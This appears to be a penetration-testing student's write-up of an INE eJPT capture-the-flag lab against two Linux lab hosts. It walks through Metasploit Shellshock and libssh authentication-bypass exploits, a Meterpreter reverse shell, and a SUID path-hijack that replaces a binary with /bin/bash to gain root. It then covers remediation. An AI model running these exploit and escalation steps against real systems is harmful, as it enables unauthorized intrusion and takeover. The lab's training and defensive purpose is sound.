<div align="center">
  <a href="../../README.md">⬅️ <b>Back to eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🎯 Host & Network Penetration Testing — System-Host Based Attacks CTF 2 🎯</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Penetration Testing Student (eJPT v2) | <b>Course:</b> Host & Network Penetration Testing: System/Host Based Attacks | <b>Difficulty:</b> Easy / Medium</p>
  <p><i>Date Completed: 02 November 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eJPT](https://img.shields.io/badge/Track-eJPT%20v2-orange?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 4/4](https://img.shields.io/badge/Flags%20Captured-4%20%2F%204-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1190%20%7C%20T1212%20%7C%20T1548.001-red?style=flat-square)](https://attack.mitre.org/)
</div>

---

## 📋 Objective & Scope
> **Perform system and host-based penetration testing against two Linux target machines (`target1.ine.local` and `target2.ine.local`). The objective is to identify exploitable service vulnerabilities, execute remote code execution via Apache CGI Shellshock, bypass authentication mechanisms on vulnerable SSH servers, perform local privilege escalation via SUID binary execution hijacking, and capture all 4 challenge flags.**

- **Target 1 (`target1.ine.local` / `192.123.62.3`):** Linux host running Apache httpd 2.4.6 with CGI scripts (`/browser.cgi`) vulnerable to the Shellshock vulnerability (CVE-2014-6271).
- **Target 2 (`target2.ine.local` / `192.123.62.4`):** Linux host (kernel 4.15–5.8) hosting an SSH service powered by `libssh 0.8.3` vulnerable to authentication bypass (CVE-2018-10933) and containing a misconfigured custom SUID binary (`welcome`).
- **Attacker Host (`root@INE`):** Kali Linux (`192.123.62.2`).

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20204952.png" alt="INE System-Host Based Attacks CTF 2 challenge dashboard showing target details and task prompts" width="850px">
  <br><i>Figure 1: INE Lab Dashboard — Challenge overview, target hostnames, objectives, and flag submission prompts.</i>
</div>

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **Nmap** | Host discovery, full TCP port scanning (`-p-`), service version detection (`-sV`), OS fingerprinting (`-A`), and NSE vulnerability verification (`http-shellshock`). |
| **DIRB** | Web path discovery identifying administrative directories and hidden endpoints (`/cgi-bin/`, `/static/`). |
| **Firefox Browser** | Web interface interaction, browser detection validation (`/browser.cgi`), and status code verification. |
| **Metasploit Framework (`msfconsole`)** | Automated exploit delivery via `exploit/multi/http/apache_mod_cgi_bash_env_exec` (Shellshock) and `auxiliary/scanner/ssh/libssh_auth_bypass`. |
| **GNU Strings (`strings`)** | Static binary reverse engineering to inspect embedded calls and shared library references inside compiled SUID binaries. |
| **Linux Shell Utilities** | File manipulation (`ls`, `cat`, `rm`, `cp`), SUID execution, and interactive root shell escalation. |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | Technique ID | Technique Name | Description in Lab |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Conducting comprehensive Nmap TCP sweeps, service versioning, and NSE vulnerability scanning. |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploiting Apache mod_cgi Shellshock (`CVE-2014-6271`) on `target1.ine.local` for remote shell access. |
| **Execution** | `T1059.004` | Command and Scripting Interpreter: Unix Shell | Executing commands via Meterpreter and spawning interactive `/bin/bash -i` shells. |
| **Credential Access / Bypass** | `T1212` | Exploitation for Credential Access | Exploiting the `libssh 0.8.3` state machine flaw (`CVE-2018-10933`) to bypass SSH authentication. |
| **Privilege Escalation** | `T1548.001` | Abuse Elevation Control Mechanism: Setuid and Setgid | Exploiting SUID root binary `/home/user/welcome` (`-rwsr-xr-x`) to execute privileged operations. |
| **Defense Evasion / Execution** | `T1574.009` | Hijack Execution Flow: Path Interception | Replacing the unquoted relative binary `greetings` with `/bin/bash` to spawn an escalated root shell. |
| **Discovery** | `T1083` | File and Directory Discovery | Enumerating root `/`, webroot `/opt/apache/htdocs/`, `/home/user`, and `/root` to extract all flags. |

<br>

---

## 🔍 1. Target 1: Reconnaissance & Exploitation (`target1.ine.local`)

### 🌐 Network Scanning & Service Discovery
We begin our assessment against `target1.ine.local` with a full-port TCP service version and script scan:

```bash
nmap -sV -sC -p- target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20210722.png" alt="Nmap scan output against target1 showing Apache 2.4.6 on port 80" width="850px">
  <br><i>Figure 2: Nmap scan output against target1.ine.local (192.123.62.3) revealing Apache httpd 2.4.6 on Port 80.</i>
</div>

<br>

**Key Findings:**
- **Target IP:** `192.123.62.3`
- **Port 80/tcp (HTTP):** Apache httpd 2.4.6 ((Unix))
- **HTTP Title:** `Browser Detector`
- **HTTP Methods:** TRACE method enabled

---

### 🌐 Web Application Exploration
Navigating to `http://target1.ine.local/browser.cgi` in Firefox reveals the "Modern Art Gallery" application:

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20210944.png" alt="Modern Art Gallery web application in browser reflecting user agent" width="850px">
  <br><i>Figure 3: Modern Art Gallery landing page calling /browser.cgi and reflecting client browser identity.</i>
</div>

<br>

The application displays the message: *"Your browser, that is, Firefox, is supported!"*. This dynamic reflection of the HTTP `User-Agent` header via a CGI script (`/browser.cgi`) indicates that environment variables are passed directly to an underlying script interpreter.

---

### 📂 Directory Brute-Forcing with DIRB
To uncover additional endpoints and confirm the CGI directory configuration, we run `dirb`:

```bash
dirb http://target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20211050.png" alt="DIRB scan discovering /cgi-bin/ with HTTP 403 Forbidden" width="850px">
  <br><i>Figure 4: DIRB scan output identifying /cgi-bin/ (403 Forbidden) and /static/ listable directory.</i>
</div>

<br>

Navigating to `http://target1.ine.local/cgi-bin/` returns an HTTP 403 Forbidden response, confirming that CGI execution is enabled on the web server:

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20211147.png" alt="HTTP 403 Forbidden on /cgi-bin/" width="850px">
  <br><i>Figure 5: HTTP 403 Forbidden response when accessing /cgi-bin/ directly.</i>
</div>

<br>

---

### 💥 Vulnerability Verification: Shellshock (CVE-2014-6271)
Given the presence of Apache 2.4.6 and a publicly accessible CGI script (`/browser.cgi`), we execute Nmap's `http-shellshock` NSE script to test for command injection via HTTP headers:

```bash
nmap -T5 -sV -p 80 --script http-shellshock --script-args uri=/browser.cgi target1.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20211324.png" alt="Nmap http-shellshock NSE script confirming CVE-2014-6271" width="850px">
  <br><i>Figure 6: Nmap http-shellshock script confirming target1 is vulnerable to Shellshock (CVE-2014-6271).</i>
</div>

<br>

**Vulnerability Assessment:**
- **State:** VULNERABLE (Exploitable)
- **Vulnerability ID:** `CVE-2014-6271` (Shellshock)
- **Root Cause:** GNU Bash through 4.3 processes trailing strings after function definitions in environment variables, allowing remote unauthenticated attackers to execute arbitrary operating system commands via maliciously crafted HTTP request headers (e.g., `User-Agent`, `Cookie`, `Referer`).

---

### 🎯 Remote Exploitation via Metasploit
We load the `apache_mod_cgi_bash_env_exec` exploit module inside `msfconsole` to obtain a Meterpreter reverse shell:

```bash
msfconsole -q
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set LHOST 192.123.62.2
set targeturi /browser.cgi
exploit
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20211819.png" alt="Metasploit module configuration for apache_mod_cgi_bash_env_exec" width="850px">
  <br><i>Figure 7: Configuring the apache_mod_cgi_bash_env_exec module in msfconsole with targeturi /browser.cgi.</i>
</div>

<br>

The exploit succeeds and delivers a staged Meterpreter session on `target1.ine.local`.

---

### 🚩 Flag 1 Capture (`/flag.txt`)
Following the lab instructions (*"Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local"*), we list the root directory:

```bash
meterpreter > ls /
meterpreter > cat /flag.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20212116.png" alt="Extracting Flag 1 from /flag.txt in Meterpreter" width="850px">
  <br><i>Figure 8: Meterpreter session on target1 — Listing root directory and capturing Flag 1 from /flag.txt.</i>
</div>

<br>

> **Flag 1 Captured:** `FLAG1_7926030658704c41958f523a9f604991`

---

### 🚩 Flag 2 Capture (`/opt/apache/htdocs/.flag.txt`)
Following the second prompt (*"In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local"*), we enumerate the Apache document root with hidden file inclusion (`-a`):

```bash
meterpreter > ls -a /opt/apache/htdocs/
meterpreter > cat /opt/apache/htdocs/.flag.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20212329.png" alt="Extracting Flag 2 from /opt/apache/htdocs/.flag.txt" width="850px">
  <br><i>Figure 9: Discovering hidden file .flag.txt in /opt/apache/htdocs/ and reading Flag 2.</i>
</div>

<br>

> **Flag 2 Captured:** `FLAG2_ed9693813add41cd9f4e7a877c806c5a`

---

<br>

## 🔍 2. Target 2: Reconnaissance, libssh Auth Bypass & Privilege Escalation (`target2.ine.local`)

### 🌐 Network Scanning (`target2.ine.local`)
We pivot our active reconnaissance to the second target machine:

```bash
nmap -T5 -A target2.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20212413.png" alt="Nmap scan against target2 showing libssh 0.8.3 on port 22" width="850px">
  <br><i>Figure 10: Nmap service scan output against target2.ine.local (192.123.62.4) identifying libssh 0.8.3 on Port 22.</i>
</div>

<br>

**Key Findings:**
- **Target IP:** `192.123.62.4`
- **Port 22/tcp (SSH):** `libssh 0.8.3 (protocol 2.0)`
- **Operating System:** Linux 4.15 – 5.8
- **Service Fingerprint:** `libssh` server implementation (not OpenSSH).

---

### 💥 Vulnerability Analysis: libssh Authentication Bypass (CVE-2018-10933)
`libssh` versions 0.6.0 through 0.7.5 and 0.8.0 through 0.8.3 suffer from a severe server-side state machine vulnerability (`CVE-2018-10933`):
- By sending an unexpected `SSH2_MSG_USERAUTH_SUCCESS` packet to the server instead of the standard `SSH2_MSG_USERAUTH_REQUEST`, the server transitions into an authenticated state without verifying credentials.
- This allows unauthenticated attackers to establish a channel and spawn an interactive shell on the target system.

---

### 🎯 Remote Exploitation via Metasploit
We configure the `auxiliary/scanner/ssh/libssh_auth_bypass` module in `msfconsole`, enabling pseudoterminal allocation (`spawn_pty true`):

```bash
msfconsole -q
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS target2.ine.local
set spawn_pty true
run
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20212609.png" alt="Configuring libssh_auth_bypass module in Metasploit" width="850px">
  <br><i>Figure 11: Configuring auxiliary/scanner/ssh/libssh_auth_bypass with spawn_pty enabled.</i>
</div>

<br>

The auxiliary module creates Session 1. We interact with the shell session and upgrade to an interactive bash shell:

```bash
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions 1
sh-5.2$ /bin/bash -i
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20213205.png" alt="Interactive shell on target2 capturing Flag 3" width="850px">
  <br><i>Figure 12: Interacting with Session 1, upgrading to bash, and capturing Flag 3 from /home/user/flag.txt.</i>
</div>

<br>

---

### 🚩 Flag 3 Capture (`/home/user/flag.txt`)
Following the prompt (*"Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local"*):

```bash
[user@target2 /]$ cd /home/user
[user@target2 ~]$ ls
flag.txt  greetings  welcome
[user@target2 ~]$ cat flag.txt
```

> **Flag 3 Captured:** `FLAG3_8b813e38d09d421491a887c9ebc40e62`

---

### 🛡️ Local Privilege Escalation: SUID Binary Execution Hijacking

#### 1. Enumeration of Permissions
Listing `/home/user` in detailed format reveals critical permissions:

```bash
[user@target2 ~]$ ls -la
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20213411.png" alt="Listing permissions and strings output on welcome binary" width="850px">
  <br><i>Figure 13: Detailed permissions of /home/user showing SUID binary welcome and strings analysis.</i>
</div>

<br>

**Key Observations:**
- `-rwsr-xr-x 1 root root 8344 Jun 11 2024 welcome`
  - Owned by `root` with the SUID bit set (`-rws`).
  - Executable by any user.
- `-rwx------ 1 root root 8296 Jun 11 2024 greetings`
  - Executable only by `root`.

#### 2. Reverse Engineering the SUID Binary
Running `strings` on `welcome` exposes its execution mechanics:

```bash
[user@target2 ~]$ strings welcome
```

The output reveals:
- Calls to `setuid`
- Calls to standard C `system()`
- The plain command string: `greetings`

Because `welcome` executes `greetings` without an absolute path (e.g., calling `system("greetings")` rather than `system("/usr/bin/greetings")`), the system will search for `greetings` according to the current working directory / environment PATH, or in the local folder where the user has write permissions!

#### 3. Execution Flow Hijacking & Root Shell Escalation
Since `/home/user` is owned by user `user`, we have full write access to the directory. We remove the existing `greetings` binary and replace it with a copy of `/bin/bash`:

```bash
[user@target2 ~]$ rm -rf greetings
[user@target2 ~]$ cp /bin/bash greetings
[user@target2 ~]$ ./welcome
```

<div align="center">
  <img src="./images/Screenshot%202026-11-02%20213846.png" alt="Hijacking greetings binary to spawn root shell via welcome" width="850px">
  <br><i>Figure 14: Overwriting greetings with /bin/bash and executing ./welcome to spawn an escalated root shell.</i>
</div>

<br>

When `./welcome` executes as SUID root, it calls `setuid(0)` and then executes `greetings`. Because `greetings` is now our copy of `/bin/bash`, it spawns an interactive root shell (`#` prompt)!

---

### 🚩 Flag 4 Capture (`/root/flag.txt`)
With root privileges confirmed (`[root@target2 ~]#`), we navigate into the root home directory to capture the final flag:

```bash
[root@target2 ~]# cd /root
[root@target2 root]# ls
flag.txt
[root@target2 root]# cat flag.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-03%20121752.png" alt="Capturing Flag 4 from /root/flag.txt" width="850px">
  <br><i>Figure 15: Accessing /root directory and reading Flag 4 from flag.txt.</i>
</div>

<br>

> **Flag 4 Captured:** `FLAG4_01f9219c7c4a4ef6aff75cf080ef9b49`

---

<br>

## 🏁 3. Flags Summary
| Flag | Target | Prompt / Location | Flag Value | Technical Exploitation Vector |
| :---: | :--- | :--- | :--- | :--- |
| **Flag 1** | `target1.ine.local` | Check root (`/`) directory | `FLAG1_7926030658704c41958f523a9f604991` | Apache mod_cgi Shellshock RCE (`CVE-2014-6271`) → Meterpreter `cat /flag.txt` |
| **Flag 2** | `target1.ine.local` | Explore `/opt/apache/htdocs/` | `FLAG2_ed9693813add41cd9f4e7a877c806c5a` | Directory discovery via Meterpreter `ls -a` → `cat /opt/apache/htdocs/.flag.txt` |
| **Flag 3** | `target2.ine.local` | Investigate user's home directory | `FLAG3_8b813e38d09d421491a887c9ebc40e62` | `libssh 0.8.3` Auth Bypass (`CVE-2018-10933`) → `cat /home/user/flag.txt` |
| **Flag 4** | `target2.ine.local` | Look into `/root` directory | `FLAG4_01f9219c7c4a4ef6aff75cf080ef9b49` | SUID binary execution hijacking (`./welcome` → `greetings`) → `cat /root/flag.txt` |

<br>

---

## 🛡️ 4. Vulnerability Risk Ratings & Defensive Hardening

### 📊 CVSS v3.1 Findings Matrix
| Finding | Severity | CVSS v3.1 Score | Vector String |
| :--- | :---: | :---: | :--- |
| **GNU Bash Shellshock Remote Code Execution (`CVE-2014-6271`)** | 🔴 Critical | **9.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **libssh Server Authentication Bypass (`CVE-2018-10933`)** | 🔴 Critical | **9.1** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **SUID Relative Binary Path Execution Hijacking** | 🟠 High | **7.8** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Sensitive Hidden Flag Files in Webroot** | 🟡 Medium | **5.3** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |

<br>

### 🔧 Enterprise Remediation Guidelines

<details>
<summary><b>1. Remediation for GNU Bash Shellshock (CVE-2014-6271)</b></summary>
<br>

- **Root Cause:** GNU Bash allows trailing command execution after function definitions passed via environment variables created from HTTP headers by Apache CGI handlers.
- **Remediation:**
  1. **Patch Bash:** Upgrade `bash` to the latest package version through the system package manager:
     ```bash
     apt-get update && apt-get install --only-upgrade bash
     # On RHEL/CentOS
     yum update bash
     ```
  2. **Deprecate Insecure CGI Scripts:** Replace legacy bash-based CGI scripts with modern, memory-safe alternatives or web frameworks (Python WSGI, Node.js, Go) that do not evaluate shell commands directly from unvalidated environment variables.
  3. **WAF Filtering:** Deploy ModSecurity or cloud WAF rules blocking HTTP request headers matching patterns such as `() { :;};`.
</details>

<details>
<summary><b>2. Remediation for libssh Authentication Bypass (CVE-2018-10933)</b></summary>
<br>

- **Root Cause:** A logic flaw in `libssh` server state machines accepts `SSH2_MSG_USERAUTH_SUCCESS` from the client before authentication has occurred, granting unauthenticated shell access.
- **Remediation:**
  1. **Upgrade libssh:** Upgrade to version `0.8.4` or `0.7.6` or later where packet sequencing checks reject unsolicited authentication success packets.
  2. **Standardize on OpenSSH:** For administrative server access, use audited OpenSSH daemon implementations (`sshd`) with strict public key authentication and disabled password authentication.
  3. **Network Segmentation:** Place SSH management services behind a bastion host / VPN and restrict ingress access using iptables/nftables firewall rules.
</details>

<details>
<summary><b>3. Remediation for SUID Binary Path Hijacking</b></summary>
<br>

- **Root Cause:** The compiled executable `/home/user/welcome` called the relative command `greetings` via `system()` instead of specifying a hardcoded, trusted absolute path (e.g., `/usr/local/bin/greetings`), allowing standard users to intercept execution.
- **Remediation:**
  1. **Enforce Absolute Paths in Source Code:**
     ```c
     // VULNERABLE:
     system("greetings");

     // SECURE:
     system("/usr/local/bin/greetings");
     ```
  2. **Avoid system() in SUID Programs:** Use `execve()` with sanitized environment arrays (`char *const envp[]`) to prevent PATH injection and command substitution.
  3. **Audit SUID Binaries Regularly:**
     ```bash
     find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null
     ```
  4. **Mount User Home Directories with nosuid:** Enforce the `nosuid` mount option on `/home` partitions so users cannot place or execute SUID binaries in user-writable spaces:
     ```text
     /dev/sdb1  /home  ext4  defaults,nosuid,nodev  0  2
     ```
</details>

<br>

---

## 💡 5. Key Learnings & Takeaways
- **CGI Scripts Remain a High-Value Attack Vector:** Even simple diagnostic scripts like `/browser.cgi` can provide immediate initial access if the underlying system environment is unpatched.
- **Authentication State Machine Flaws are Devastating:** The `libssh` vulnerability demonstrates that protocol design flaws can bypass credentials entirely without requiring brute-forcing or credential harvesting.
- **SUID Execution Hijacking is Instantaneous:** Writing or calling external binaries without absolute paths inside SUID executables provides an immediate path to root for any local user with directory write privileges.

---

<div align="center">

**[⬅️ Back to eJPT Track Hub](../../README.md)** • **[🏠 Portfolio Root](../../../README.md)**

*Walkthrough documented on 02 November 2026. Part of the INE eJPT Certification Journey.*

</div>
